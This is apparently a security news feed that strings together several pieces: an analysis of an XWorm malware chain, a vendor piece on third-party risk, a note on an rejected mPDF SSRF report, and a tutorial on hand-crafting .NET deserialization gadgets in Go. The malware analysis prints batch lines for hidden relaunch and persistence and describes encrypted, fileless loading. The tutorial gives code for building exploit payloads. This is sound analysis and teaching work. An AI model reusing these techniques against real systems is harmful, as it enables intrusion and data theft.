rely on macros.Compared with an Excel document, a  attachment immediately stands out as unusual in modern business email and is often blocked by gateway rules. In this case, the sender may also have been counting on hidden file extensions () to make the file look like a harmless invoice; a small deception that still fools busy users.Although  is largely obsolete, it’s not harmless. Visual Basic Script can run arbitrary commands on Windows and can download or create additional malicious files. It’s crude, but it still works if it gets past filters or lands with an unaware user.I expected the code to be less-than-sophisticated, but only the first level was.The  dropped  into  (C:\Windows\Temp\IrisBud.bat) and invoked it via WMI. The  restarted itself in a way so it ran invisibly. The batch then copied itself to the user profile as  and contained heavy obfuscation. Its end goal was to run a PowerShell loader that read encoded strings from  and turn them into the real payload.Our team identified that payload as Backdoor.XWorm—a remote-access trojan (RAT) sold as malware-as-a-service. If executed, it would give attackers stealthy access to the machine: steal files and credentials, record keystrokes, install more malware, or deploy ransomware.The whole chain runs quietly and is designed to avoid detection. Simply opening the attachment would have put the user’s data at serious risk. If you have found Backdoor.XWorm on your machine, we advise you to follow the remediation and aftermath sections of this detection profile.The  file at first sight looked like alphabet soup, but the last line (of 429) provided the plan. I commented out that last line so  would create  but  execute it.However, my hopes of the batch file being easier to read were quickly run into the ground. Most of the batch file consisted of simple  commands which wrote almost everything ad verbatim into .But if you look closely you see a lot of repeated variables like  in the first line and  in line 30. I determined that these variables were not assigned a value and only there for “padding.” Padding is a technique used by malware authors to make their malicious programs harder to detect or analyze.Imagine you have a box with secret contents that you don’t want anyone to find easily. To hide what’s really inside, you fill the box with a lot of extra, useless material—like packing peanuts, shredded paper, or just empty space—so it’s difficult for someone to see or measure what’s actually important in the box.So, my first move was to get rid of all the padding. Although not perfect, that cleared some things up.The lineif not DEFINED Abc1 (set Abc1=1 & cmd /c start "" /min "%~dpnx0" %* & exit)is a classic malware technique to hide execution from the user while keeping the script running in the background. Let’s look at it step by step: — Checks if the variable  doesn’t exist yet. — Sets the variable to  (which marks that this check has been done).cmd /c start "" /min "%~dpnx0" %* — Restarts the batch file:
 runs a new command prompt starts a program minimized (invisible to the user) is the full path to the current batch file itself passes along any command-line arguments — Exits the current (visible) instanceSo, in other words the first time it runs:It restarts itself in a minimized/hidden window.The original visible instance exits immediately.The new hidden instance continues running with  set, so it won’t trigger this restart loop again.And this line:copy "%sourceFile%" "%userprofile%\aoc.bat" >nulis where the bat file copies itself to the user’s profile directory. — The source (set earlier to the current batch file’s full path). — The destination: the user’s profile directory (typically ) with the new name . — Suppresses output (hides the “1 file(s) copied” message).The setlocal enabledelayedexpansion is needed because exclamation marks () around variables are used for delayed variable expansion, which allows the batch script to update and use the value of variables dynamically within loops or code blocks where normal percent expansion wouldn’t work. This requires delayed expansion to be enabled which is done with the command setlocal enabledelayedexpansion.From the next lines I can tell that the  which we see can be replaced by the  command.Because it is defined by:set "xmgotoyfycqitjc=!ejlhixzkmttzgho!e!ugcqubmykdxgowp!"where earlier we saw:set "ejlhixzkmttzgho=s"set "ugcqubmykdxgowp=t"Together this makes xmgotoyfycqitjc = s + e + t so my next step was to replace all those instances. And with that we made a good start at mapping out all the variables that were not intended as padding.Of specific interest in this case was one particular line (414) where all the mapped variables came together.The only two other lines that stood out were two lines that begin with  and contain a very long string. While these superficially appear to be ordinary batch comments, they actually hide encrypted payload data (lines 41 and 69 are the hidden payload).We’ll get to those later on.First, we need to construct line 414 into something readable.After replacing all the defined variables, line 414 turned into this:Windows\System32\WindowsPowerShell\v1.0\powershell.exe-nop -c coding]::Unicode.GetString([Convert]::FromBase64String(('CgAkA…..{very_long_base64_encoded_string}…..AoA'.Replace('hkfdo','')))))The  command showed me that I had to remove even more padding—this time from the encoded PowerShell script which was padded with the  string.After I did that and decoded the base64 string, this was the PowerShell script:What this PowerShell script does explains why the two long lines I referred to earlier are needed:: the script looks for the hidden payload in  (the copy it created). The script reads  line by line, looking for lines that start with  (three colons). If it finds one, it treats everything after the colons as Base64-encoded data, decodes it, and runs it as PowerShell code. This is a way to hide malicious commands inside what looks like a batch file comment. creates the main malicious payload The big block (starting with ) does several things:Reads encrypted data from : It looks for a line starting with  (two colons) in the batch file, which contains encrypted and compressed malware. It uses AES encryption (with a hardcoded key and Initialization Vector (IV)) to decrypt the payload. Think of this like unlocking a safe with a specific combination. After decryption, it unzips the data using GZip compression. The malware was squeezed down to make it smaller and harder to detect.Loads and runs the malware: The decrypted/decompressed data turns out to be two executable files. The script loads these files directly into memory and runs them without ever saving them to disk. This is called a “fileless attack” and helps avoid anti-malware detection.By loading and running these malicious programs directly in memory, the attack avoids dropping visible files on disk, making it much harder for anti-malware solutions to spot or capture the real threat.To extract the payload safely I wrote a Python script to reproduce steps 1–3 without executing the code in memory. That produced two executable samples which I ran in an isolated sandbox.The sandbox revealed a mutex  which pointed to the XWorm family. “Mutex” stands for mutual exclusion, which is a special marker that a running program creates on a Windows computer to make sure only one copy of the process is running at once. Malware authors bake them into their code and security analysts catalog them, much like a “fingerprint.” So when our researchers see one of the known mutex names, they can easily classify the malware and move on to the next sample.

In 2024, 30% of breaches involved a third-party vendor, twice as much as the previous year.Static assessments are no longer enough. Questionnaire-based audits provide only outdated snapshots, leaving organizations blind to evolving threats between review cycles.Continuous, intelligence-led monitoring is essential. Real-time visibility into vendors’ external security posture enables faster detection, objective risk scoring, and proactive defense.Recorded Future’s Third-Party Intelligence closes the gap. By continuously tracking over 5 million organizations and 1 million technology products, it gives security teams the data-driven insight needed to stay ahead of emerging supply chain threats.The Modern Supply Chain: A Widening Attack SurfaceThe digital supply chain has undergone a profound transformation. What was once a small network of trusted vendors has evolved into a vast, interconnected web of technologies, platforms, and data flows.Cloud providers now host mission-critical infrastructure. SaaS platforms handle sensitive data. Managed service providers, subcontractors, and open-source libraries form the unseen backbone of daily operations. Each of these relationships expands the attack surface, introducing new dependencies and new vulnerabilities.A single vendor today may rely on dozens of others, each with its own third- and fourth-party relationships. The result is an ecosystem of thousands of potential ingress points, with many of them outside an organization’s direct line of sight. These dependencies are often invisible beyond the first tier, leaving businesses exposed to risks they may not even know exist.Cybercriminals understand this. Supply chain compromises have become a preferred strategy for attackers because infiltrating a vendor is often easier and more scalable than targeting an organization directly. By compromising one trusted connection, adversaries can pivot to dozens of downstream victims, often before the original breach is even detected.This expanding ecosystem demands a new approach. Securing the modern digital supply chain requires continuous, intelligence-led visibility, one that provides an external, real-time view of every partner and vendor’s security posture. Only with ongoing, data-driven insight can organizations uncover hidden exposures and detect emerging threats before small weaknesses become systemic failures.The Unavoidable Truth: Key Third-Party Risk Statistics for 2025Every year, the volume, cost, and complexity of vendor-related breaches continue to rise, exposing weaknesses that traditional risk management can’t contain. The following third-party risk statistics illustrate just how pervasive the problem has become and why a new approach is urgently needed.Third-party breaches are no longer isolated events. They are becoming a defining feature of the modern threat landscape.According to Verizon’s most recent Data Breach Investigations Report, 30% of breaches involved a third-party vendor, twice as much as the previous year. However, this figure is likely conservative due to underreporting and misclassification, especially when the compromise occurs several layers deep in their vendor ecosystem.According to IBM’s 2024 Cost of a Data Breach report, the average cost of a third-party breach is over $5.08 million. Highly regulated sectors such as healthcare and finance face even steeper costs.The true financial impact of a breach extends beyond the initial response, encompassing lost revenue, increased cyber insurance premiums, and reputational damage that drives customer churn. Organizations may also face expensive marketing and PR efforts to restore trust after a high-profile supply chain incident.Dwell time — the duration between initial compromise and detection — compounds these costs. In 2024, organizations with a dwell time beyond 200 days faced average breach costs of $5.01 million.Gartner research reveals that third-party breaches cost roughly 40% more to remediate than those that originate within an organization’s own systems, due to the additional complexity of managing incidents that span multiple entities, legal jurisdictions, and data environments. When breaches involve personally identifiable information (PII), PHI, or payment card data, costs can climb even higher as regulatory penalties and legal exposure multiply.Hidden Dangers: Fourth-Party and Nth-Party RiskModern supply chains extend far beyond the vendors an organization directly manages. Each third-party relationship is underpinned by its own network of fourth and nth parties—subcontractors, technology providers, and cloud services. These indirect dependencies create exposure that most organizations can neither see nor control.According to Whistic’s 2024 Third-Party Risk Management Impact Report, half of all companies work with more than 100 vendors, up from 38% in 2023. And for each third-party vendor in a supply chain, organizations typically have indirect relationships with nearly 14 times more fourth and fifth parties, according to The Cyentia Institute.These numbers underscore the growth of interconnected risk. Each new supplier introduces dozens of unseen connections, and every one of those connections can become an attacker’s entry point. The impact can quickly cascade through shared platforms, APIs, and service providers, affecting multiple tiers of partners and customers.The MOVEit breach of 2023 is a prime example. What began as a single vulnerability in one file transfer application rapidly spread across thousands of organizations, from banks and universities to government agencies. Many of those affected never had a direct contract with the compromised vendor.Why Traditional Third-Party Risk Assessments Are FailingFor many organizations, third-party risk management still relies on the same tools and tactics used a decade ago—static checklists, self-reported questionnaires, and periodic audits. These methods were designed for a slower, more predictable vendor landscape. Today, they’re simply outmatched by the size and interconnectivity of modern supply chains.Vendor questionnaires and checklists are only as good as the answers provided. Too often, the information is outdated, incomplete, or inaccurate, leaving security teams with a false sense of assurance. These assessments might capture what a vendor’s security looked like at a single moment in time, but attackers don’t wait for your next scheduled check-in. Every day between audits is another opportunity for adversaries to exploit newly discovered vulnerabilities or misconfigurations.Static assessment programs also lack the scale and speed required to monitor hundreds or thousands of vendors effectively. As the vendor ecosystem expands, traditional approaches simply can’t keep pace with the dynamic nature of today’s threat environment.The data underscores just how strained these legacy methods have become:44% of organizations assess more than 100 third parties each year, yet only 4% of organizations have high confidence that their third-party questionnaires accurately reflect real-world risk.Nearly four in ten companies use multiple questionnaires for different risk domains, sending an average of 55 questionnaires to third parties annually.These numbers reveal a troubling paradox: organizations are spending more time than ever assessing vendors but gaining less clarity than ever in return. Without continuous, intelligence-led visibility, even the most diligent third-party risk programs are operating one step behind and measuring compliance rather than managing risk.Shifting from Assessment to Intelligence: A Better ApproachTraditional third-party risk assessments expose the limits of hindsight. Intelligence-led monitoring delivers the advantage of foresight.Static questionnaires stop at the vendor’s last self-reported status, which quickly becomes obsolete when adversaries move by the hour. An intelligence-based approach, by contrast, looks outward to live signals, behavioral patterns, and threat activity that reflect a vendor’s true security posture in real time.The core shift is from  to . capture what vendors say about their defenses. reveals what attackers see (and often what vendors don’t yet know).This change is more than a process upgrade; it’s an evolution in how organizations manage supply chain security. Continuous, intelligence-led monitoring replaces static snapshots with ongoing, data-driven visibility across every tier of the vendor ecosystem.By ingesting indicators from the open web, dark web, and technical telemetry, organizations can identify vulnerabilities or emerging exploit chatter as they happen—not months after the fact. The advantages are clear: Intelligence shifts third-party risk from response to prevention, allowing teams to identify issues before they evolve into breaches.Objective vs. Subjective: Real-world data replaces self-attestation, grounding risk decisions in observable evidence rather than vendor claims.Comprehensive Visibility:Continuous monitoring provides an attacker’s-eye view of each vendor’s digital footprint, uncovering blind spots that traditional audits miss.How Recorded Future’s Third-Party Intelligence Delivers Continuous, Contextual InsightRecorded Future’s Third-Party Intelligence exemplifies this modern approach. It delivers real-time risk scores and actionable alerts derived from the broadest range of data sources available, including dark web monitoring, technical telemetry, and validated threat intelligence. These insights integrate into existing risk management workflows, transforming static oversight into a living, adaptive defense.Core capabilities include: Tracks over 5 million organizations and 1 million technology products for breaches, malicious traffic, ransomware extortion, and dark web chatter. Uses machine learning and NLP to analyze data from hundreds of thousands of open, dark web, and technical sources, generating dynamic Risk Scores that quantify vendor exposure.Dark Web and Threat Intelligence. Identifies data leaks, compromised credentials, and chatter around vendor breaches before disclosure.Comparative Vendor Assessment. Enables side-by-side comparison of vendors to prioritize procurement and onboarding decisions. Delivers comprehensive, context-rich risk profiles for leadership and board reporting. Connects with existing TPRM, GRC, and ticketing platforms, feeding risk data into established workflows.Automated Mapping of Internal Entities and Subsidiaries. Assesses risk stemming from a supplier’s technical infrastructure, subsidiary relationships, and geographic footprint. Allows teams to define criteria for alerts (e.g., vendor breach, new exposure) and focus only on the most relevant risks.Customer outcomes include:73% average increase in visibility into potential threats32% less time spent on evaluating new vendors or supplier35% more third parties assessed43% average increase in security team capacityOur time to detect third-party cyber breaches has decreased substantially. Previously, we were either notified directly by a third party or via a news outlet or regulatory reporting, which meant that it could take days or even weeks for us to be made aware. With Recorded Future, we've been able to identify third-party concerns within one to two days.Cybersecurity Incident Management, Insurance CompanyThe evidence is clear: reactive oversight leaves organizations blind to threats already moving through their supply chains. A continuous, intelligence-driven approach changes that equation. By combining real-time visibility with actionable insights, security and risk teams can detect vendor threats early, respond faster, and reduce the financial and reputational fallout of supply chain attacks.Don’t wait for the next third-party breach to become another statistic. Book a demo to see how Recorded Future’s Third-Party Intelligence helps organizations stay ahead of rapidly evolving risks.What is considered a third-party risk?A third-party risk is any potential threat to your organization's security, finances, or reputation posed by an external vendor, supplier, partner, or contractor who has access to your data, systems, or networks. This includes risks like data breaches, operational disruptions, and compliance violations originating from your supply chain.What are the main types of third-party risk?The main types include cybersecurity risk (data breaches, malware), operational risk (service disruptions), compliance risk (violating regulations like GDPR or CCPA), reputational risk (damage to your brand by association), and financial risk (revenue loss, regulatory fines).How often should third-party risk assessments be conducted?While traditional best practice was to conduct assessments annually, the current threat landscape demands a shift to continuous monitoring. Relying on annual, point-in-time assessments leaves significant security gaps where a vendor's risk posture can change without you knowing.How does Recorded Future help with third-party risk assessment?Recorded Future’s Third-Party Intelligence solution transforms risk assessment from a static, manual process into a dynamic, data-driven one. It provides continuous, real-time intelligence on your vendors' external security posture by monitoring millions of sources, including the dark web. This allows you to proactively identify threats, prioritize risks with objective scoring, and take action before a vulnerability impacts your organization.What is the first step to improving a third-party risk management program?The first step is to gain complete visibility into your entire vendor ecosystem. You cannot protect what you don't know you have. This involves identifying every third party and fourth party with access to your data or systems and then beginning the process of prioritizing them based on their level of access and criticality to your operations.]]></content:encoded></item><item><title>Breaking mPDF with regex and logic</title><link>https://medium.com/@brun0ne/breaking-mpdf-with-regex-and-logic-bf915300483f</link><author>/u/ZoltyLis</author><category>netsec</category><pubDate>Wed, 12 Nov 2025 23:24:06 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[So, what did I do about it?Of course right away I thought the developer of mPDF should be made aware of this behavior.I reported it on  and got acknowledgement from the main maintainer on (6 months ago as of writing this article).This behavior has not been changed/fixed as of writing this article.On  I requested a CVE via the MITRE CVE form.On  the request was rejected with the following response:These are not valid vulnerability reports, and no CVE IDs will be assigned.Please refer to the documentation:“Warning: All user input passed to mPDF should be sanitized properly.”A finding of SSRF is not relevant, because mpdf intentionally makes outbound network requests that depend on the content of theA project’s choice to release a PDF producer for sanitized and trustedHTML input does not mean that they are required to implement asanitizer as part of their project.

This article discusses how that library came to be while providing enough information into that process to allow others to create their own gadget chains by hand if they so please. At the end, we discuss how to use the new go-exploit library to generate deserialization payloads (without the need for Windows), or for integration in your own Golang-based exploits, regardless of whether or not they use go-exploit. Our library is designed to be used "out of the box" by any Go program without needing to define or set up any special objects. You can learn more about the advantages of go-exploit here.Challenges of adding deserialization payloads into exploitsHow to create your own deserialization library, including a technical breakdown of .NET serialization streamsHow to use VulnCheck's own .NET deserialization library for golang-based exploitsWhen you are writing .NET deserialization exploits in a language other than C# and you want dynamic parameters in your payload, your options are generally limited to "shelling out" to ysoserial.net or pasting in a binary array that was  by ysoserial.net and then editing it at runtime.Neither of these options is great. The first option demands that you use a specific program on a specific operating system (Windows) to create the gadgets. The second option is prone to mistakes due to the length encoding of strings and certain records being incorrectly implemented; it also makes the payload less modifiable/clean.We instead opt for a third option: to create the .NET gadgets "by hand" for our golang-based exploit framework, go-exploit.
In doing so, we learned a great deal about the .NET serialization stream structure and will present it in this article to help those wishing to do something similar in their own framework or anyone just wanting to learn more about serialization streams.Though this article is written in the context of golang, the same ideas should be transferable to any other language.I am going to show how .NET deserialization objects are broken down by looking at what their sub-components are and how they are constructed during serialization. After that I will show you how to create your own serialization library that would allow you to recreate these gadgets in any language. Finally, I will show how to use gadgets directly from the new go-exploit library..NET deserialization payloads are effectively a stream of "Records" which can be thought of as structs. Given that records are effectively structs, it makes sense that to create gadgets, we should make structs and then place them in a byte array such that we produce a sane gadget at the end.Throughout this tutorial we will be using an ObjRef gadget, viewable using this cyberchef link. I chose this gadget because it is small and simple; other gadgets are generally much larger.The very first record we will look at in the stream is a static record that begins every serialized .NET stream, the SerializationHeaderRecord.Here is the hex dump for the SerializationHeaderRecord:00000000  00 01 00 00 00 ff ff ff ff 01 00 00 00 00 00 00  |.....ÿÿÿÿ.......|
00000010  00                                               |.|
According to the documentation above: "The SerializationHeaderRecord record MUST be the first record in a binary serialization. This record has the major and minor version of the format and the IDs of the top object and the headers."Almost every link in this article will be to Microsoft documentation and while I am certain that you know how to read given that you've made it this far, I have dropped a few tips below to ease interpretation of these pages for those who are unfamiliar with the format.There is a table representing the layout of the record; I find this table more confusing than helpful so you may want to consider ignoring it (see image below for clarification).The information  the table that breaks down each member of the struct is typically much more useful and easier to read.The member information in the documentation is in the same order that the members appear within the records.You can assume all INT32 values are little-endian.It is important to read all member descriptions.Now that we know how to decipher the Microsoft docs, let's get on to the first member in the record, RecordTypeEnum.The description for this member reads: "RecordTypeEnum (1 byte): A RecordTypeEnumeration value that identifies the record type. The value MUST be 0."When reversing serialized streams on your own for reconstruction, this byte is the first byte you will see for a given record and it tells you what record is coming next. In this case, we saw a , so we know a SerializationHeaderRecord is coming.Every record type has its own  that is 1 byte, and each record has a different number that is sequential based on their order in the RecordTypeEnumeration. That link contains a list of all the record types, of which only a subset have been useful for payloads, having written about a dozen or so gadgets by hand. With that said, I would  suggest going ahead and implementing every gadget, but rather build them as needed.So for a SerializationHeaderRecord, this value will ALWAYS be  in hexidecimal, so we should represent this as a constant somewhere in our code. In the Microsoft docs you see that RecordTypeEnumeration is exactly that, an enum, so we should just make an enum for record types in our code. I am using Golang, which does not have have enums natively, and while there are methods for creating them in go, I will just use a string map because that will serve my purposes just fine here. Using the Microsoft docs as reference, it looks something like this:var RecordTypeEnumMap = map[string]int{
    "SerializedStreamHeader":         0,
    "ClassWithId":                    1,
    "SystemClassWithMembers":         2,
    "ClassWithMembers":               3,
    "SystemClassWithMembersAndTypes": 4,
    "ClassWithMembersAndTypes":       5,
    "BinaryObjectString":             6,
    "BinaryArray":                    7,
    "MemberPrimitiveTyped":           8,
    "MemberReference":                9,
    "ObjectNull":                     10,
    "MessageEnd":                     11,
    "BinaryLibrary":                  12,
    "ObjectNullMultiple256":          13,
    "ObjectNullMultiple":             14,
    "ArraySinglePrimitive":           15,
    "ArraySingleObject":              16,
    "ArraySingleString":              17,
    "MethodCall":                     21,
    "MethodReturn":                   22,
}
The next member is RootId (4 bytes), which is described as "An INT32 value (as specified in  section 2.2.22) that identifies the root of the graph of nodes."This is a variable value, so let's add it to the struct as an int. Remember that we did not add RecordTypeEnum because this is a constant/static value.// The start of our SerializationHeaderRecord struct
type SerializationHeaderRecord struct {
    RootID int
}
Remembering that all INT32 values are little-endian, and knowing that this is a  from the hex dump, we know we need to have this member output . That said, we can start making some methods for our struct to produce the binary output for this record:// NOTE: SerializationHeaderRecord struct is still incomplete
var RecordTypeEnumMap = map[string]int{
    "SerializedStreamHeader":         0,
    ... // omitted for brevity
}
type SerializationHeaderRecord struct {
    RootID int
}
func (serializationHeaderRecord SerializationHeaderRecord) RecordToBin() (string, bool) {
    recordTypeEnumString := string(byte(RecordTypeEnumMap["SerializedStreamHeader"]))
    rootIDString := transform.PackLittleInt32(serializationHeaderRecord.RootID)
    return recordTypeEnumString + rootIDString, true
}
shr := SerializationHeaderRecord{ RootID: 1 }
shr.RecordToBin() // should yield "\x00\x01\x00\x00\x00" at this time
This is the basic idea and structure of how to create these records and ultimately turn them into binary streams. Enough records converted into binary streams in the right order, you have a finished serialization stream!Continuing on, the next member is the HeaderId, which much like the previous member, is described as a variable INT32 value. We will add this to the struct as an int:type SerializationHeaderRecord struct {
    RootID   int
    HeaderID int
}
The MajorVersion and MinorVersion are a little different from the last two members as they MUST be 1 and 0 respectively.
We do not need to add them to the struct, but instead just update the  method for this struct to finish off our implementation of this record.type Record interface {
    ToRecordBin() (string, bool)
}

var RecordTypeEnumMap = map[string]int{
    "SerializedStreamHeader":         0,
    ... // omitted for brevity
}

type SerializationHeaderRecord struct {
    RootID int
    HeaderID int
}

func (serializationHeaderRecord SerializationHeaderRecord) RecordToBin() (string, bool) {
    recordTypeEnumString := string(byte(RecordTypeEnumMap["SerializedStreamHeader"])) // 0
    rootIDString := transform.PackLittleInt32(serializationHeaderRecord.RootID)
    headerIDString := transform.PackLittleInt32(serializationHeaderRecord.HeaderID)
    majorVersion := transform.PackLittleInt32(1) // MUST be 1
    minorVersion := transform.PackLittleInt32(0) // MUST be 0
    return recordTypeEnumString + rootIDString + headerIDString + majorVersion + minorVersion, true
}

shr := SerializationHeaderRecord{ RootID: 1 , HeaderID: -1 }

shr.RecordToBin() // should yield "\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00"

// add it to the full gadget being built
var gadgetRecords []Record
gadgetRecords = append(gadgetRecords, shr) // adding serialization header record to the gadget
Note: The code snippet above and all others in this article are for informational purposes and are not guaranteed to be completed/valid code. Remember, if you need a fully working library to reference or use as is, see go-exploit's dotnet deserialization package.Now things get a bit more interesting with the very next record in the stream, SystemClassWithMembersAndTypes.Here is the hex dump for SystemClassWithMembersAndTypes:00000010  __ 04 01 00 00 00 10 53 79 73 74 65 6d 2e 45 78  |......System.Ex|

The SystemClassWithMembersAndTypes record starts at offset 0x11. This is sort of the "main" record that you will see in .NET gadgets, or its alternative, ClassWithMembersAndTypes. By main record I mean, this is the record that actually defines the object/class that is intended to be deserialized which is sort of the "point" of a serialization stream. The difference between the two types above (SystemClassWithMembersAndTypes and ClassWithMembersAndTypes) is that the SystemClassWithMembersAndTypes is missing a LibraryID, as it is implicitly understood to be a system class and does not need it explicitly defined. Otherwise, these two records are the same.These class records are quite verbose as they are primarily composed of two other (non-record) data structures: a ClassInfo and a MemberTypeInfo. Viewing the documentation, we again see a RecordTypeEnum indicating that this is a SystemClassWithMembersAndTypes record which in this case, must be a 4. If you look, this is already present in our RecordTypeEnumMap above.Moving onto the ClassInfo member, we can model it as a struct like so:type ClassInfo struct {
    ObjectID int          // A value represented as an INT32
    Name string           // Length prefixed string
    MemberCount int       // should be equal to len(MemberNames) // this could also just be created dynamically during to ToRecordBin() method
    MemberNames []string  // MemberNames
}
The first member of this struct is an Object ID. These are not specific to ClassInfo structures but are actually a part of many other records and structures that compose .NET serialization streams. These are basically used as unique identifiers or even "addresses" to reference objects throughout a serialization stream. These generally increment by 1 with each new object added to a stream.The value for this one, as show in the dump output above, should be a 1. Represented as a little-endian INT32 ().Next is the Name. This is the name of the actual class, though it is not a normal string but is instead a LengthPrefixedString. Do not assume this is "just an int of the length" — it is encoded in a specific way as defined in the documentation. Though for shorter length strings this  usually come out to simply be something like hex(len(string)).To make things easier, I will leave the appropriate function for encoding this length below, from our go-exploit dotnet package.func Write7BitEncodedInt(value int) []byte {
    var (
        bs []byte
        v  = uint(value)
    )
    for v >= 0x80 {
        bs = append(bs, byte(v|0x80))
        v >>= 7
    }
    bs = append(bs, byte(v))
    return bs
}
The Name for this one is "System.Exception", which makes sense, given that this is a system class and we are dealing with a SystemClassWithMembersAndTypes. But do not forget to prefix it with the encoded length (16, which in this case comes out to ), making it: .Next is MemberCount, another INT32 value. As the name suggests, this is the number of members that are defined in the next item in the struct, the MemberNames. As the dump shows, this is a 1, which we know will be represented as .Last in ClassInfo, is the array of MemberNames, which is a sequence of LengthPrefixedStrings. These define the member names for the class. Remember we should only expect to read N members from this where N == MemberCount. In this case, the only member name present should be "ClassName" with its length prefix in hex: .So that does it for ClassInfo, but remember that was just one component of the SystemClassWithMembersAndTypes; the next is the MemberTypeInfo, a data structure that exists to provide information ABOUT the members of the class.Do not be fooled by how few members are shown in the documentation. This component is probably the source of the most confusion when building these serialization objects by hand, primarily due to "AdditionalInfos".First is BinaryTypeEnums. Per the docs, this is a sequence of single bytes that denote the data TYPE for each member of the class. The attribution of a given type to its corresponding member is derived from the POSITION of the individiual BinaryTypeEnum in the sequence relative to the sequence of class members. All possible BinaryTypeEnum values are located here.That was probably a bit unclear, so for example, if you have three members in a class, let's say they are someStringOne (String), someStringTwo (String), and someIntThree (Int).// note: this is pseudocode
class SomeClass {
    someStringOne string
    someStringTwo string
    someIntThree  int
}
The MemberTypeInfo.BinaryTypeEnums section for that class should simply be: "\x01\x01\x00".This is because according to the BinaryTypeEnum values documentation, "\x01" denotes a string of which there are two here. The int value, however, is not represented as its own enum value — this is where it gets a tad bit more confusing.According to these docs, an int value is a primitive type and is therefore defined as a PrimitiveTypeEnum value. So we mark its BinaryTypeEnum value as a "\x00" (Primitive) so that when the stream is read it knows to look at the next section (AdditionalInfos) to determine the  type of this member.So to recap, our hypothetical "\x01\x01\x00" is described as a string (0x01), another string (0x01), and a primitive type (0x00) which we define as an int in the next section, AdditionalInfos.This is a data structure that in some class-based records will not be used at all. It is ONLY present if and when one of the BinaryTypeEnums are either Primitive, SystemClass, Class, or PrimitiveArray. An easy way to remember it is to see if any of the BinaryTypeEnums have primitive or class in their names. If the binary type for a given member is anything OTHER than those four, an AdditionalInfos entry is NOT needed for that member. If NONE of the members' BinaryTypeEnums values are primitive or class based, then you can omit the AdditionalInfos component entirely.Depending on if it is a Primitive, SystemClass, Class, or PrimitiveArray, a different type of value is expected in the AdditionalInfo data structure. Keep in mind also that the values within the AdditionalInfos data are position-correspondent, just like BinaryTypeEnum itself. This means that a given value within the AdditionalInfos section corresponds with the position of the BinaryTypeEnum requiring an AdditionalInfos value to be added.To clarify further... if you had someStringOne, someIntTwo, someStringThree, and someIntFour, they would have a BinaryTypeEnum section of . Of those four BinaryTypeEnums, only TWO of them require an AdditionalInfos entry, so the entire AdditionalInfos section for those members would be  (0x08 denotes INT32). The first  would correspond to someIntTwo, and the second  would correspond to someIntFour; the strings are ignored because they are not a Primitive, PrimitiveArray, SystemClass, or Class BinaryTypeEnum and thus do not need AdditionalInfos for them.I hope that made sense, because now we will look at the AdditionalInfos section for the SystemClassWithMembersAndTypes from our ObjRef example which uses a slightly more complicated BinaryType to define which is the SystemClass as denoted by the  in the BinaryTypeEnums section. To aid the reader, this BinaryTypeEnum is located at offset 0x35 of the CyberChef dump.If we look at the MemberTypeInfo documentation again, specifically at the AdditionalInfos section, we see the following sentence: "For the BinaryTypeEnum value of SystemClass, this field specifies the name of the class (2)". So that means slap a string in there, and of course it must be a LengthPrefixedString not just a string by itself.So just to summarize, the BinaryTypeEnums section for this SystemClassWithMembersAndTypes's MemberTypeInfo section is . Immediately following that, we start the AdditionalInfos if needed. Because the BinaryTypeEnums section contains a SystemClass BinaryTypeEnum, we DO need to provide an AdditionalInfos section, which in this case must be the name for the system class. Therefore, the AdditionalInfos section for this SystemClassWithMembersAndTypes's MemberTypeInfo section would be the prefix , followed immediately by "System.Runtime.Remoting.ObjRef". If there  more Primitive or Class-based BinaryTypeEnum defined in the BinaryTypeEnums section of this MemberTypeInfo, then AdditionalInfos entries would immediately follow this LengthPrefixedString.Great, so we have exhausted all of the members for SystemClassWithMembersAndTypes which ends at offset 0x54. So what is all the stuff after it in the CyberChef hexdump output?Well, we know that the SystemClassWithMembersAndTypes has ended because we made all of the sections per the defined specification. When a record ends in a serialization stream, the next byte is generally a new record; therefore the RecordTypeEnumeration documentation must be consulted. But something else that has not been revealed thus far and is not described well in the relevant Microsoft documentation: when a MemberTypeInfo ends, what generally follows immediately after is the VALUE for those defined members, one after another in a sequence.Knowing that, we can assume that the next record is the VALUE for the members we just defined. According to the RecordTypeEnumeration documentation, the next byte, a  (offset 0x55), is a MemberReference record. If you remember above where I talked about ObjectIDs, this is where the primary record references those.If you look at the documentation for the MemberReference.IdRef section, it says that the ObjectID can be for an object that comes after OR before the referencing record. If we said the ObjectID is like a memory address of an object, you can think of the MemberReference as a pointer to these objects — this way, if that object is referenced multiple times, you do not need to redefine the entire object record but can instead just provide a MemberReference record to an already defined object, which is only 5 bytes rather than the size of an entirely new object.type MemberReferenceRecord struct {
    RecordTypeEnum int // 1 BYTE, ALWAYS a 0x09
    IDRef int          // 4 BYTES - INT32 value containing the ObjectID that is being referenced
}
Given that the only previous object we defined (the "System.Exception" SystemClassWithMembersAndTypes) has an ObjectID of 1, we can assume the referenced object will come AFTER this record in the serialization stream. This assumption stands true, as the very next record  have an objectID of  and it should be familiar since it is another SystemClassWithMembersAndTypes. To clarify, the VALUE for the only member in the previously defined SystemClassWithMembersAndTypes ultimately points to  SystemClassWithMembersAndTypes.Again, here is the full dump for easier reference:00000000  00 01 00 00 00 ff ff ff ff 01 00 00 00 00 00 00  |.....ÿÿÿÿ.......|

Our new record begins at hex 0x5A.I will not rehash everything since we have already defined a very similar record, but I  define the values in case there is confusion. You could also stop here and try and make it yourself if that sounds like fun to you.SystemClassWithMembersAndTypes.RecordTypeEnum = 4 SystemClassWithMembersAndTypes.ClassInfo.ObjectID = 2 , This should look familiar from the immediately preceding MemberReference record.SystemClassWithMembersAndTypes.ClassInfo.Name = lenPrefix  + "System.Runtime.Remoting.ObjRef", Should also familiar from the AdditionalInfos section of Object 1.SystemClassWithMembersAndTypes.ClassInfo.MemberCount = 1 SystemClassWithMembersAndTypes.ClassInfo.MemberNames = lenPrefix  followed by the string: SystemClassWithMembersAndTypes.MemberTypeInfo.BinaryTypeEnums = . States that the only member for this class if of type: string.SystemClassWithMembersAndTypes.MemberTypeInfo.AdditionalInfo = "", nothing for this as we do not need it; none of the BinaryTypeEnums are Classes or Primitives based, all we have is a string.Those are all of the values for all of the components of  object, but as we know, we defined one member; therefore, we must provide one member value immediately following the SystemClassWithMembersAndTypes, and because this a serialization stream, we cannot simply have random values floating around in the stream. All things must be defined in a RECORD since once again, a serialization stream is a sequence of records.With all of that said, the member type that we defined is of BinaryTypeEnum , which is a string. So how do we represent a string as a record? Using the next record in the dump, a BinaryObjectString, defined 